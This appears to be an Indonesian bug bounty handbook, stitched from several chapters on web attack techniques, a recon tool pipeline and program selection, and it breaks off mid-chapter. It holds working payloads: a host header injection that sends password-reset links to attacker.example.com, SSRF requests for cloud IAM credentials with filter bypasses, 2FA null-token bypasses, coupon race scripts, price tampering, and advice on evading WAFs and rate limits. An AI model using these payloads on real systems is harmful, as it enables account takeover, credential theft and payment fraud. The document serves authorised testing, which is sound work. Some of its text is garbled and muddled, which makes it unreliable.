## 2. Subdomain Takeover Flow

**Apa yang dikirim:** permintaan resolusi DNS + HTTP ke aset dangling.

```bash
# Recon
subfinder -d example.com -silent | httpx -silent > live.txt
dig +short CNAME stage.example.com  # cek dangling

# Fingerprint target service
curl -s https://stage.example.com -H "Host: stage.example.com" | head -30
```

**Perintah claim per platform (2025 status):**

| Platform | Signature response | Bisa diklaim? |
|---|---|---|
| GitHub Pages | `There isn't a GitHub Pages site here.` | ✅ custom domain via repo setting |
| Heroku | `No such app` | ❌ closed sejak 2023 (verified account + kartu) |
| Fastly | `Fastly error: unknown domain` | ⚠️ perlu akun verified |
| Shopify | `Sorry, this shop is currently unavailable` | ✅ trial store |
| Pantheon | `The gods are wise...` | ✅ |
| Azure (*.cloudapp.azure.com) | 404 NS expired | ⚠️ random name collision |

**Kenapa berhasil:** CNAME tetap menunjuk ke layanan, tapi resource di dalam layanan sudah dihapus. Layanan menerima `Host:` header dan mencari konfigurasi — jika kosong dan registrasi terbuka, kita klaim.

**Kenapa gagal:** platform menutup self-registration; wildcard CNAME yang sebenarnya sudah di-serve; respons custom 404 bukan default page korban implementasinya sendiri.

**Angle report:** dampak = `pishing pada subdomain internal / cookie scope (.example.com)` + jika subdomain menerima cookie sesi → langsung hubungkan ke ATO untuk kelas yang lebih tinggi. Sertakan screenshot claim + QR `Host:` header.

---

## 3. ATO Chain (Account Takeover)

**Apa yang dikirim:** kombinasi bug rendah (IDOR, OAuth misconfig, host header injection email reset) yang dialikan ke session takeover.

**Komponen chain umum 2026:**

```http
# Host header injection → poison reset link
POST /forgot-password HTTP/1.1
Host: attacker.example.com
Content-Type: application/x-www-form-urlencoded

email=victim@example.com
```

**Kombinasi IDOR:**
```
GET /api/v2/invoices/884713  → punya PII (nama, alamat)
GET /api/v2/profile/884713   → email terlihat
PUT /api/v2/profile/884713/email → session takeover
 ```

**Kenapa dihitung 1 bug:** program premium menghitung chain final, bukan komponen. `CVSS 9.1` endpoint chain dengan scope `CHANGED` biasanya baseline medium minus.

**Kenapa gagal:** salah satu link pakai akun sendiri; victim perlu interaksi; komponen "by design" (share link); bug bounty program menolak melihat chain yang di-build dari bug existing / duplicate.

**Angle report:** buat diagram chain merender 1 slide, demokan end-to-end dengan 2 akun fresh, sertakan request/response HAR.

---

## 4. SSRF → Cloud Metadata

**Apa yang dikirim:**

```http
POST /api/export/pdf HTTP/1.1
Content-Type: application/json

{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```

**Bypass filter umum:**

```bash
# IP alternatif 169.254
http://metadata.google.internal/computeMetadata/v1/ # GCP, butuh header
# (GCP requires `Metadata-Flavor: Google`)

# Bypass via ASCII art / decimal IP
http://2852039166/
# via domain ganda
http://169.254.169.254.attacker-basic-auth@  (basic auth prefix)

# Banyak filter 2025 pakai regex teruk regexp: url += "/@169.254.169.254" belum cukup.
```

**Kondisi per cloud provider (2025):**

| Provider | Endpoint | Sukses rate 2025 |
|---|---|---|
| AWS (IMDSv1) | `169.254.169.254/latest/meta-data/` | <10% target (IMDSv2 dot `PUT` token) |
| AWS (IMDSv2) | butuh `X-aws-ec2-metadata-token` | ~30% hasil via SSRF blind |
| GCP | `metadata.google.internal` + `Metadata-Flavor: Google` | tinggi kalau header injectable |
| Azure | `169.254.169.254/metadata/instance` `+Header: true` | sedang |

**Kenapa berhasil:** fitur upload-by-URL/import-by-URL di SaaS mem-fetch resource user-supplied tanpa egress filter/allowlist internal IP.

**Kenapa gagal: IMDSv2** butuh 2 langkah (PUT token, GET data) — perlu SSRF verb-confusion atau 302 redirect metode switch; egress NAT ke internet diperbolehkan tapi `169.254.x.x` di-drop di level network policy.

**Angle report:** nilai kritisnya bukan SSRF-nya, tapi role ARN yang terdump — sertakan `iam/security-credentials/<ROLE>` output, sebut policy name, hindari dump kredensial lebih lanjut (mark as HIGH impact, don't exploit further).

---

## 5. Web Cache Deception di SaaS

**Apa yang dikirim:**

```http
GET /account/settings/anything.css HTTP/1.1
# atau
GET /account/settings/style.css HTTP/1.1
```

**Uji cache key:**

```bash
# Fingerprint cache behavior
curl -sD - "https://app.example.com/account/settings/x.css" \
  | grep -i -E "x-cache|age:|cf-cache-status|hit"
# Repeat request, check HIT

# Varnish/Cloudflare x-proxy bypass
GET /account/settings/a.css%0a
GET /account/settings/a.css?x=1
```

**Kenapa berhasil:** cache layer (Fastly, Cloudflare, Akamai) meng-cache jalur berakhiran `.css`/static extension. Backend route tanpa `.css` tetap respond dengan HTML sesi (framework routing normal mengabaikan suffix), tapi cache menyimpan body authenticated sebelum sesi expire.

**Kenapa gagal:**
- Cache key mungkin hanya di-set saat `Cache-Control: private`. Modern stack mengirim `Cache-Control: private` di setiap dynamic response.
- `Cache-Control` matching di salah satu cdm (Cloudflare Rule) sudah default WARN pada behavior ini.
- Backend memang 404 untuk unknown path.
- Backend route pakai trailing slash redirect.

**Angle report:** impact sebenarnya adalah cache poisoning hybrid — jika cache HIT by victim API response, next attacker can get rakit intercept via shared cache. Ringkas: demo 2 akun + screenshot `x-cache: HIT` pada data korban.

---

## 6. Race Condition (Limit Overrun)

**Apa yang dikirim:**

```bash
# Setup
sudo ip link set eth0 mtu 1500  # default, tapi pastikan TCP offload on

# Standard tool 2025: racepwn / turbo intruder
# Burp Suite → Intruder single-packet attack
# atau turu intruder points:
# race-the-web (browser only), http-smuggle → 20 parallel connections
```

```bash
# Klasik: 30 requests in parallel
for i in {1..30}; do
  curl -s -X POST https://api.example.com/v1/coupon \
    -H "Authorization: Bearer $TOKEN" \
    -d "code=WELCOME10" &
done; wait
```

**Kenapa berhasil:** backend melakukan SELECT lalu INSERT tanpa unique constraint atau lock — beberapa transaksi paralel lolos di antara window `check` dan `use` state perubahan.

**Kenapa gagal:**
- Perlu single-packet attack (last-byte sync) untuk <3ms window (HTTP/2 better)
- Backend pakai DB transaction / unique constraint + partial rollback
- Nginx/Apache rate-limit memblokir 30 sekaligus (warrant static drop, tidak response) — hindari `rate_limit` via x-forwarded header

**Angle report:** sebutkan race window (`~4ms`) dan jumlah sukses (e.g. 1 coupon digunakan 7x atas 14 attempts). **Critical**: jika jumlah gagal > jumlah sukses, triage team akan menilai low reproduction. Gunakan timeline log HTTP dari server.

---

## 7. TOCTOU Payment / Coupon

**Apa yang dikirim:**

```http
# 1. Basket add dengan validasi harga
PUT /api/cart/items
{"id": "SKU-9771", "qty": 1, "price_at_add": 19.99}

# 2. TOCTOU: ubah qty setelah payment intent dibuat
POST /api/checkout/session
{"cart_id": "abc", "total": 19.99}  # server dapat harga cached/stale

PATCH /api/cart/abc/items/SKU-9771  {"qty": 100}
# Server cost calculation terpisah / di defer sampai packet ulang
```

```http
# Coupon timing
POST /api/coupons/WELCOME10/apply → 200 OK, discount locked
POST /api/coupons/WELCOME10/apply → again (race, sebelum max_uses counter increment)
```

**Kenapa berhasil:**
- `payment_intent` amount di-letakkan di server-side, tapi ada bug simple: `amount` parameter hidden di server object, tapi amount berasal dari cached cart total.
- Race TOCTOU: fix `uses_count` setelah checkout selesai — increment terlambat.

**Kenapa gagal:**
- Stripe PaymentIntent sudah pakai amount lock (amount immutable setelah schedule)
- Backend revalidate cart total di `payment_intent` creation atomically

**Angle report per program:**
- TIDAK sempurna order submit sampai selesai (hingga nominal kasar) — endpoint payment di sandbox mode, jangan buat transaksi riil di production.
- Fokuskan report di code path yang memungkinkan discount >100% (overwrite amount) daripada qty manipulation.

---

## 8. 2FA Bypass

**Apa yang dikirim:**

```http
# Session-state bypass
POST /login/totp
{"totp_code": ""}  # vs
{"totp_code": null} # vs
{"totp": true}
```

```http
# Bypass via flow skip / step-null
POST /api/v2/auth/verify
{"step": null, "token": "<session token dari step 1>"}
# beberapa stack skip validation by null object
```

**Password reset flow yang tidak page-check 2FA:**
```http
GET /reset-password?token=<reset-token> → password reset bypasses 2FA requirement
```

**Kenapa berhasil:** state machine auth dengan steps terpisah (step-1 = password, step-2 = 2FA) → server generate session token final di step-1 sudah, bukan setelah 2FA confirm.

**Kenapa gagal:**
- Session-token hanya issued setelah combined factor validation (industri standard 2025).
- Step-2 verify memang cek full state.

**Angle report:** selalu test `2fa_enforced` bypass versus password-reset. Uji juga apakah token `session`-auth server versi api lama (v1) masih menerima flow deprecated.

**Apa yang dikirim:**

```json
// Negative quantity
{"id": "SKU-9771", "qty": -1}

// Decimal quantity
{"qty": 0.5}

[
  {"id": "SKU-9771", "qty": 1, "price": 0.01}
]

// Blueprint type confusion
{"price": "1e-4", "qty": 1}  // JavaScript: 1e7 * 1e-4 parsing
```

**Kenapa berhasil:** backend percaya state yang dikirim client (price/qty client-side override). 0-recheck `amount` server-side.

**Kenapa gagal:** client hanya data display-only; server revalidate semua — inilah high rejection (bug bounty median rating 6.6 jika line 1 pada code).

**Angle report:** kunci = demonstrasi impact. Actual checkout flow sampai step sebelum payment confirm. Sertakan yang berhenti di ujung sebelum finalize. Jangan submit-order — gunakan screenshot send merchant total validation.

---

## 10. Jebakan Operasional (Kenapa Teknik Ini Gagal di Lapangan)

1. **Subdomain takeover:** DNS txt record cynamically generated — bukan dangling name — menggunakan platform CDN yang different dari yang di-mapping CNAME. Grabbing via dig NS level, bukan HTTP response.

2. **Race condition:** Jangan pakai Burp piggy-backed via HTTP/1.1 di VM kantor — jaringan lokal jitter 30-80ms fatal di window <5ms. Wajib VM bare-metal di region DC (e.g., DigitalOcean SGP1 untuk target APAC), interface mapping satu-connection-one-socket.

3. **SSRF:** Banyak team kirim payload SSRF via tool raw curl — service SaaS target pakai retry policy, metadata call ke `169.254.169.254` dibounce (nanti timeout client). Gunakan single-shot via raw socket, hindari retry library.

4. **Cache deception:** Cache node tidak selalu stable — kirim 20 request berturut-turut di window 30 detik untuk sampling x-cache response. Isinya domain akun SaaS multi-tenant app sering sudah ke-SRP-rendered non-sensitive.

5. **TOCTOU payment:** Jangan pernah menulis report yang menyebut nominal profit / potensi theft chargeback — denda legal + permanent ban. Frame selalu sebagai "failed validation of transaction integrity" with sandbox API counterparty (e.g., Stripe test card `4242 4242 4242 4242`).

6. **2FA bypass:** Target banyak via 3rd-party IdP (Auth0, Okta) — bypass jangan dilakukan di client flow, tapi harus via server callback step (provider callback URL mismatch, state param reuse). Jika global IdP, data diject tenant isolation — otomatis out-of-s scope.

7. **Business logic:** Payout merosot karena over-report dengan testcase yang tidak submit checkout. **Minimum bar:** nominal terkalkulasi melalui 2 langkah konfirmasi (PATCH cart → payment-intent amount). Tanpa perubahan `payment_intent.amount`, impact dianggap speculative.

8. **Unique constraint:** Race test dilakukan pada bug scale, quantity 2 → flaky. Team atau Reperlu biasanya reproduksi hanya 1/10 time. **Best practice:** jalankan parallel requests minimal 20x per window 3 trial, hanya report bila success ≥ 2/3 trial.

9. **SaaS multi-region migrasi:** 2026 banyak program sudah migrasi infra ke CDN-level proxy (Cloudflare Workers fronting) — HTTP/2 connection coalescing membuat request-host-header confusion terjadi antar hostname. Domain race target harus diuji satu-satu; cookie scope SaaS (e.g., `.example.com`) bisa nyangkut di隔壁 env tenant staging.

10. **Language/tool version:** Pastikan report environment konsisten. Burp Suite Pro 2025.x build cyrillic race-engine hanya BN100+ (aturan jumlah parallel di-harness rewrite). Bug tool lama masih pakai last-byte sync sederhana — target modern HTTP/2 already will see group behavior diff karena nghttp2 coalescing.


## bb-recon

# bb-recon — bb

# Bab 12: Bug Bounty Recon Pipeline 2026

## 12.1 Overview Arsitektur Pipeline

Pipeline recon modern terdiri dari 5 tahap: enumerasi subdomain → resolusi DNS → permutation → probing HTTP/service → URL & JS mining → template scanning.

```
Assets → subfinder/amass → puredns resolve → dnsx/gotator → httpx → naabu
                                                              ↓
                                        waybackurls/gau/katana → LinkFinder/SecretFinder/xnLinkFinder → nuclei
```

---

## 12.2 Subdomain Enumeration

### 12.2.1 subfinder

**Perintah:**
```bash
subfinder -d target.com -all -recursive -o subs_subfinder.txt -t 100 \
  -sCT  # simpan certificate transparency raw
```
Flag `-all` mengeksekutasi semua source (default hanya source passively-fast). Versi rujukan: subfinder v2.6.x (projectdiscovery).

**Apa yang dikirim:** query ke 30+ passive source (Censys, crt.sh, FOFA, Chaos, VirusTotal, Shodan, SecurityTrails).
**Apa yang muncul:** plaintext list subdomain.
**Kenapa berhasil:** passive source tidak menyentuh infra target — zero footprint, tidak kena WAF/rate limit.
**Kenapa gagal:** akun API free tier Censys/Shodan habis quota per jam; internal-only subdomain (tidak pernah terekspos CT log) tidak muncul.

Setup API keys di `$HOME/.config/subfinder/provider-config.yaml`:

```yaml
censys: ["<api-id>:<secret>"]
shodan: ["<api-key>"]
virustotal: ["<api-key>"]
github: ["<token>"]
chaos: ["<projectdiscovery-api-key>"]
```

### 12.2.2 Amass (passive mode)

**Perintah:**
```bash
amass enum -passive -d target.com -o subs_amass.txt \
  -config ~/.config/amass/config.ini
```
Amass v4.x. Mode `-passive` = tanpa packet ke infra target. Tambah `-alts` tidak berhasil di passive mode — permutation hanya di active mode (`-active`), gunakan gotator sebagai gantinya (lihat 12.4).

**Perbedaan vs subfinder:** Amass mengekstrak subdomain juga dari ASNP/others relationship dan parsing halaman web (passively scraping vendor pages), sehingga sering menemukan asset milik vendor/brand yang `subfinder` lewatkan.

**Kenapa gagal:** Amass lambat — passive full `target.com` bisa 20-40 menit. Timeout source yang mati (BeетеAPI, dll.) menyebabkan hang tanpa progress di beberapa build v4.0-4.3.

### 12.2.3 github-subdomains

**Perintah:**
```bash
github-subdomains -d target.com -t ghp_xxxx -o subs_github.txt
# atau via gau-style token file
```

**Apa yang dikirim:** GitHub code search API untuk `-d target.com` dan pattern subdomain.
**Apa yang muncul:** subdomain yang muncul di code/PR/issues — termasuk **internal subdomain**: `internal-api.target.com`, `staging.target.com`, dev URL di config file.
**Kenapa berhasil:** developer bocorkan internal hostname di repo, gists, dan gists removed tapi masih ter-index.
**Kenapa gagal:** GitHub API rate limit 30 search request/menit (authenticated 30/menit, unauthenticated 10/menit). Gunakan beberapa token dan rotasi.

### 12.2.4 Fusi & Dedup

```bash
cat subs_*.txt | sort -u > subs_all.txt
# normalisasi wildcard: hapus entry yang resolve ke semua NXDOMAIN
```

---

## 12.3 Resolusi DNS — puredns & dnsx

### 12.3.1 puredns

**Perintuh:**
```bash
puredns resolve subs_all.txt \
  --resolvers resolvers.txt \
  --wildcard-domain target.com \
  --wildcard-batch 30 \
  -w subs_resolved.txt \
  --dns-validate
```

**Yang dikirim:** DNS query A/AAAA ke resolver publik (list resolvers ~1000 entries dari trickest/resolvers). `--wildcard-batch 30` menguji 30 random prefix (`a1b2c3.target.com`) untuk deteksi wildcard DNS.
**Yang muncul:**
- `subs_resolved.txt` — hanya subdomain yang resolve, **bebas wildcard false positive**
- `subs_wildcards.txt` — subdomain di bawah wildcard-record

**Kenapa berhasil:** puredns melakukan two-pass validation (`--dns-validate`): setiap IP answer diverifikasi ulang oleh resolver lain untuk menghindari DNS poisoning/router hijack dari resolver mati.

**Kenapa gagal:** ISP resolver di jaringan operasional melakukan DNS filtering → false negative. Provider DNS (Cloudflare 1.1.1.1, Quad9) rate limit resolusi massal (>~2000 req/mnt) → hasil terpotong. Ganti ke resolv.conf lokal DNS server sendiri atau subscribe list resolver trickest yang di-update.

### 12.3.2 dnsx

**Perintah:**
```bash
dnsx -l subs_resolved.txt -a -aaaa -cname -resp -silent -o dnsx_out.txt \
  -cdn  # deteksi CDN (bug bounty reject WAF/CDN assets sering)
cat subs_resolved.txt | dnsx -a -resp -recon  # screenshot-style fingerprint
```

**Yang muncul:**
```
api.target.com [1.2.3.4] [CNAME: api-eu-west-1.elb.amazonaws.com] [AWS]
static.target.com [... CNAME: d3xyz.cloudfront.net] [CDN: CloudFront]
```

**Kenapa penting:** `-cdn` flag memberi tahu **sebelum** scanning apakah asset di CDN — menghemat nuclei run dan mencegah scan blocking/whitelabel error. CNAME chain disclosure juga sering bocorkan asset pihak ketiga (vendor SaaS, forgotten stack).

Fingerprint berbasis teks:
```bash
dnsx -l subs_resolved.txt -a -resp -fc <(internetdb response, use ipinfo)
```

---

## 12.4 Permutation — gotator

**Perintah:**
```bash
gotator -sub subs_resolved.txt -perm permutations_list.txt -depth 1 \
  -numbers 10 -mindup -adv -md -silent > subs_permutations.txt

puredns resolve subs_permutations.txt --resolvers resolvers.txt \
  --wildcard-batch 30 -w subs_perm_resolved.txt
```

**Apa yang dikirim:** generate kandidat dari wordlist pattern (`admin.`, `dev.`, `vpn.`, `-prod`, `-homolog`, `old.`, `uat.`) di-setiap subdomain:
```
api.target.com → api-dev.target.com, api-old.target.com, admin-api.target.com
```

**Apa yang muncul:** subdomain yang tidak muncul di CT log — karena cert-nya wildcard (bagian penting: banyak perusahaan pakai `*.target.com` wildcard sehingga CT log zero-visible).
**Kenapa berhasil:** internal naming convention konsisten. Jika `api-eu.target.com` ada, kemungkinan besar `api-us.target.com`, `api-asia.target.com` ada.
**Kenapa gagal:** tanpa `--wildcard-batch` di resolusi, hasil permutation di wildcard domain (misalnya `*.cloudfront.net`) menghasilkan 100% false positive.

---

## 12.5 HTTPXTech Detect

**Perintah:**
```bash
httpx -l subs_all_resolved.txt -o httpx_out.txt \
  -title -tech-detect -status-code -follow-redirects \
  -ports 80,443,8080,8443,8888,9443 \
  -threads 150 \
  -timeout 15 \
  -json -o httpx.json \
  -location   # capture Location header untuk redirect routing
  -cname \
  -websocketpathx  # not yet standard
```

Flag inti untuk recon:
| Flag | Fungsi |
|------|--------|
| `-tech-detect` | fingerprint via Wappalyzer core (nginx 1.25, Apache 2.4.62, WordPress 6.x, React, Next.js) |
| `-title` | HTML `<title>` |
| `-status-code` | HTTP status |
| `-follow-redirects` | follow ke origin server (mengungkap `login.target.com` → SaaS) |
| `-web-server` | parse `Server` header (nginx 1.25.3, Werkzeug 3.0, IIS 10.0) |
| `-ip`, `-cname`, `-cdn` |

Sample output JSON:
```json
{
  "url": "https://admin.target.com",
  "status_code": 200,
  "title": "Grafana",
  "webserver": "nginx 1.25.3",
  "tech": ["Grafava 10.4.0", "Go", "nginx 1.25.3"]
}
```

**Kenapa berhasil:** versi software konkret = triage origination. Grafana 10.x → cek CVE-2024-9264 (SQL Expressions), nginx 1.25 tanpa patch → cve known path.
**Kenapa gagal:** banner masking, `Server:` dihapus; TLS fingerprint false; beberapa web app pakai SPA di mana title sama blank ("Loading...") — merge dari 443 dan 80 probing needed.

---

## 12.6 Port Scanning — naabu

**Perintah:**
```bash
naabu -l live_hosts.txt -top-ports 1000 -rate 1000 -c 25 \
  -exclude-ips /24-range/to-skip.txt \  # skip CIDR sponsor-owned
  -o naabu_1000.txt
# atau full TCP range untuk high-value hosts:
naabu -host high_value_target -p - -rate 1500 -o naabu_full.txt
# service detection via nmap jika perlu UDP:
sudo nmap -sU -sV --top-ports 100 high_value_target
```

Naabu v2.3.x — SYN scan, ultra cepat (10k+ pps), tapi:
**Kenapa gagal:** perlu root/SYN_RAW untuk full performance; di Windows 11 24H2/WSL2 raw socket privilеge issue — run via VPS Linux. SYN rate tinggi trier IDS — some providers block inbound ICMP dest-unreachable → false positive open port; always verify:
```bash
nc -zv host port  # atau
nmap -sV -p PORT host
```

---

## 12.7 URL Collection

### 12.7.1 waybackurls & gau

```bash
echo target.com | waybackurls > urls_wayback.txt
gau --threads 5 --timeout 30 target.com --o urls_gau.txt
# gabung
cat urls_*.txt | sort -u > urls_all.txt
# filter injection points:
cat urls_all.txt | uro > urls_uniq.txt  # dedup with param-based uniqueness
grep "api\|admin\|internal\|\?.*=" urls_uniq.txt | qsreplace FUZZ
```

**Apa yang muncul:** URL historis termasuk endpoint yang **sudah deprecated** tapi masih live (endpoint `.php`, parameter `?id=`, path `/api/v1/`). gau tambahkan CommonCrawl + OTX + URLScan index.

### 12.7.2 katana (crawler aktif)

```bash
katana -u https://target.com -d 5 -jc -kf all -fx \
  -o urls_katana.txt \
  -c 60 -headless  # JS-render untuk SPA (Chrome 131 headless)
```

Flag penting: `-jc` JS crawl (mengikuti route di dalam bundle), `-fx` fetch-xhr (intercept XHR/fetch requests di SPA React/Vue), `-kf knownfiles` (all: .env, .git/config, backup).

**Kenapa berhasil:** SPA tidak punya `<a href>` — URL tersembunyi di dalam router JS. Dengan Chrome 131 headless, XHR endpoint ke API internal tertangkap.
**Kenapa gagal:** headless Chrome 131 diblok HoneyPort/Cloudflare Turnstile challenge; depth 5 di site besar = jaringan crawl hari; binary blob (PDF, video) tidak di-extract default → gunakan `-fx=true -X GET,POST`.

---

## 12.8 JS Mining

### 12.8.1 LinkFinder — endpoint extraction

```bash
# LinkFinder (GerbenJavado)
python3 linkfinder.py -i https://target.com/assets/*.js -o cli -d -E
# atau dari file
python3 linkfinder.py -i 'target.com/*.js' -o results.html
```

**Apa yang dikirim:** download JS, regex-match pattern endpoint (`api/`, `/v[0-9]/`, string dengan `/`).
**Apa yang muncul:** list endpoint termasuk yang di-remove dari router visible tapi masih reachable.

### 12.8.2 SecretFinder

```bash
# SecretFinder (fork LinkFinder + secret regex)
python3 SecretFinder.py -i https://target.com/main.js -o results.html
# atau dict mode:
python3 SecretFinder.py -i target.com -e -o results/cli
```

**Apa yang muncul:**
```
[GOOGLE_API_KEY] AIza... 
[AWS_ACCESS_KEY] AKIA...
[SLACK_TOKEN] xoxb-...
[JIRA] url from JS
```

**Kenapa berhasil:** JS di-bundle di frontend tidak diproteksi; minified code sering masih memuat key yang "sudah diganti" tapi commit lama masih live di CDN/cache (`httpx -cache-buster` bypass).
**Kenapa gagal:** Webpack/chunk split — runtime chunk yang berisi key di-load dinamis; pastikan ambil whole file manifest via katana crawl. Nuclei dan grep manual kadang needed — regex SecretFinder false positive tinggi (validasi manual wajib: `aws sts get-caller-identity` untuk AWS key, dsb.*

### 12.8.3 xnLinkFinder (superior 2026)

```bash
xnLinkFinder -u https://target.com -e http://target.com -d 3 -sf subs_resolved.txt -o t_output/xn_recon -i -wp
# -wp = WordPress route detect, -sf = scope file validation
# dari file list
python3 xnLinkFinder.py -i httpx_out.txt -d 3 -sf scope_file -i
```

**Kenapa xnLinkFinder unggul:** (1) support in-source regex scope, (2) deduplicate route automatic dengan normalisasi param, (3) `-sp` spider relationship release large JS dan cross-scope (sub-to-sub). Output:
```
Unvalidated: /api/admin/deleteUser (potential BOLA!)
```

**Auto-parse JS:**
```bash
# extract semua JS dari output xnLinkFinder/katana buat SecretFinder:
katana -u https://target.com -d 3 -jc | grep "\.js" | sort -u > js_files.txt
# check live:
httpx -l js_urls.txt -status-code -silent | cut -d " " -f1 | \
  python3 SecretFinder.py -i -  -o results.html
```

---

## 12.9 Nuclei Selection (bukan brute-force semua template)

Jangan jalankan `-t all` (25k+ template 2026). Gunakan tag selection dengan target data dari httpx:

```bash
# 1. Update
nuclei -update-templates

# 2. Berdasarkan tech detect:
nuclei -l httpx_out.txt -tags grafana,nginx,apache -severity medium,high,critical -o nuc_tech.txt
nuclei -l httpx_out.txt -tech-detect-input ... # not built-in; use manual:
nuclei -l <(httpx.json | jq -r 'select(.tech[0]|test("Grafana")) | .url') -tags grafana

# 3. Berdasarkan service exposed (naabu output):
nuclei -u target -tags network -port 6379,27017,9200  # redis, mongo, elastic

# 4. Exposure dan config:
nuclei -l httpx_out.txt -tags exposure,config,misconfig,takeover,token

# 5. CVE-only critical:
nuclei -l httpx_out.txt -tags cve -severity critical,high -c 50 \
  -rl 80 -timeout 15 -o nuc_cve.txt
```

Rate & stealth:
```bash
nuclei -l targets.txt -c 25 -rl 50 -timeout 10 -retries 1 -random-agent
```

**Kenapa berhasil:** template tier-critical & takeover (`cname_takeover`, subdomain takeover di CNAME dangling dari dnsx output) prioritas report quality.
**Kenapa gagal:** `-tags all` = 3000+ request/host = WAF trigger, IP ban, duplikat noise.

### 12.9.1 Takeover check chain (high-yield combo)

```bash
# gabung dnsx CNAME output + httpx status & body-check
cat subs_all.txt | dnsx -cname -resp -silent | nuclei -tags takeover -o tk.txt
```
Dangling CNAME (`herokuapp.com`, `azurewebsites.net`, `zendesk`, `readme.io`, `Surge.sh`, `pantheon`) + origin-404 → potential takeover. Validasi manual sebelum report: daftar error signature di `can-i-takeover-xyz` repo.

---

## 12.10 Chained Command (Full Pipeline One-Liner-ish)

```bash
#!/bin/bash
# encode chain recon v2026
SCOPE="target.com"
RESOLVERS="resolvers.txt"

# Tahap 1: enumerasi
subfinder -d $SCOPE -all -recursive -o subs_1.txt
amass enum -passive -d $SCOPE -o subs_2.txt
github-subdomains -d $SCOPE -t $GITHUB_TOKEN -o subs_3.txt
cat subs_*.txt | sort -u > subs_all.txt

# Tahap 2: resolusi + permutation
puredns resolve subs_all.txt --resolvers $RESOLVERS \
  --wildcard-batch 30 -w subs_resolved.txt
gotator -sub subs_resolved.txt -perm wordlist/permutations.txt \
  -depth 1 -numbers 10 -silent > subs_perm.txt
puredns resolve subs_perm.txt --resolvers $RESOLVERS \
  --wildcard-batch 30 -w subs_perm_resolved.txt
cat subs_resolved.txt subs_perm_resolved.txt | sort -u > subs_final.txt

# Tahap 3: fingerprint + port
dnsx -l subs_final.txt -a -cname -resp -cdn -silent -o dnsx_out.txt
httpx -l subs_final.txt -tech-detect -status-code -title -web-server \
  -follow-redirects -json -o httpx.json
jq -r '.url' httpx.json > live.txt
naabu -l live.txt -top-ports 500 -rate 800 -o naabu.txt

# Tahap 4: URL & JS
katana -l live.txt -d 3 -jc -fx -o urls_katana.txt
echo $SCOPE | waybackurls > urls_wb.txt
gau $SCOPE > urls_gau.txt
cat urls_*.txt | sort -u | uro > urls_final.txt

# Tahap 5: JS mining
cat urls_final.txt | grep "\.js" | sort -u > js_urls.txt
xnLinkFinder -i js_urls.txt -sf subs_final.txt -o xn/
SecretFinder.py -i js_urls.txt -o secrets/html

# Tahap 6: nuclei (selection)
nuclei -l live.txt -tags takeover,exposure,misconfig,cve \
  -severity medium,high,critical -c 50 -rl 80 -o nuclei/
```

---

## 12.11 Jebakan Operasional (Field Failures)

1. **Wildcard DNS false positive** — tanpa `--wildcard-batch` puredns, `subfinder` + `dnsx` mengembalikan ribuan "live" host yang semuanya resolve ke satu IP kongkret. Selalu test `randomstring123.target.com`.

2. **CDN probing banned** — `httpx` ke `*.cloudfront.net` & `*.cloudflare.net` domain target menghasilkan 403 generic legal-block page; tech detect salah ("nginx 1.25" padahal itu edge CDN, bukan origin). Bedakan via `-cdn` flag sebelum triage.

3. **naabu tanpa raw socket = hasil sampah** — di VPS tanpa CAP_NET_RAW (container, macOS lima terminal), SYN scan timeout error jadi "open". Verifikasi port baru via `nc -zv` sebelum dianggap attack surface. WSL2 dan Windows 11 24H2 istimewa raw socket di-block WSL firewall.

4. **GitHub token scope salah** — github-subdomains butuh `repo`/`code:search` scope; token klasik dengan scope wrong return 403 yang diteruskan tanpa error log. Gunakan 3-5 token rotasi; search API limit 30 req/min, bukan 30/detail keyword permenit per-account.

5. **Rate limit web archive** — `gau` & `waybackurls` pada scope besar (100k+ URL) rate-limited oleh CommonCrawl source (delay unknown); retry-with-backoff tidak dibangun; gunakan `--threads 5 --timeout 50` dan split by subdomain list.

6. **katana headless Chrome 131 = 300MB RAM per tab** — 5+ tab dengan SPA weighty touchantara OOM di VPS 2GB; limit `-c 10` dan gunakan `--headless -time-limit 90` via Docker isolation.

7. **SecretFinder false positive** — API key regex lihat base64-string apa pun; `90%` hasil di domain satu CPA. Semua find wajib divalidasi manual (coba `sts get-caller-identity`, `curl -H "Authorization: Bearer"` dsb) — report tanpa validasi nol/dupe = reputasi bounty rejection.

8. **Nuclei `-tags cve` di host with WAF = IP banned** sebelum scan selesai; sales follow-up ` nuclei` di stage 6 menggunakan IP berbeda, domain throughput throttled (`-rl 50`), dan scan di working hours to match legitimate traffic.

9. **Resolver list public decompose** — file resolvers `trickest/resolvers` Nov month contains dead resolvers 5-15%. Perbarui tiap 2 minggu, atau build private resolver via unbound di Droplet (satu resolver sendiri dengan rate-limit disabled).

10. **Probe port 9200/6379 ke IP target di shared hosting** — host shared Webhost sering \(fine burial team\), scan port admin interface => report rejection, ma masked `block` — check IP-reputation (hosting vs dedicated) before naabu scanning.


## bounty-methodology

# bounty-methodology — bb

# 4. Metodologi Hunting

## 4.1 Pemilihan Program

Kriteria seleksi berurutan. Jangan hunting di program yang gagal di kriteria pertama.

### Tabel Skoring Program

| Kriteria | Bobot | Sinyal Positif | Sinyal Negatif |
|---|---|---|---|
| Usia program < 6 bulan | 30% | Kurang dihunting, triager belum jenuh | — |
| Scope luas (wildcard) | 25% | `*.target.com`, `*.target.com:*` | Scope `api.target.com/v2/users` saja |
| Payout median | 20% | Median > $500, publik di leaderboard | "Swag only", "Hall of fame" |
| Respon triage | 15% | Median resolusi < 7 hari (statistik HackerOne/BBP) | Report > 30 hari tanpa respon |
| Aset teknologi | 10% | Stack modern, banyak subdomain dinamis | Hanya landing page statis WordPress |

### Sumber Discovery Program Baru

```bash
# Monitor program baru — setiap pagi
curl -s "https://hackerone.com/directory/programs?order_direction=DESC&order_field=launched_at" \
  | jq '.[] | {name, launched_at, min_bounty}'

# Bugcrowd via API (simpan sesi)
curl -s -H "Cookie: _crowdcontrol_session=..." \
  "https://bugcrowd.com/programs?sort[]=latest" | head -200
```

Telescope alternatif: `intigriti.com/programs`, `yeswehack.com/programs`, channel Discord `bugbountyforum` + bot `FBI (Frida)` untuk ping program baru.

### Kenapa "Baru + Scope Luas" Menang

| Parameter | Program baru (2 minggu) | Program lama (2 tahun) |
|---|---|---|
| Jumlah hunter aktif | ~50–200 | ~3.000+ |
| Low-hanging fruit tersisa | banyak | nyaris nol |
| Duplikat rate | < 15% | > 60% |

Rumus praktis: **expected value = median_payout × P(novel_finding) × (1 − P(duplicate))**. Program lama dengan payout tinggi kalah dari program baru scope luas payout sedang.

---

## 4.2 Time-Boxing

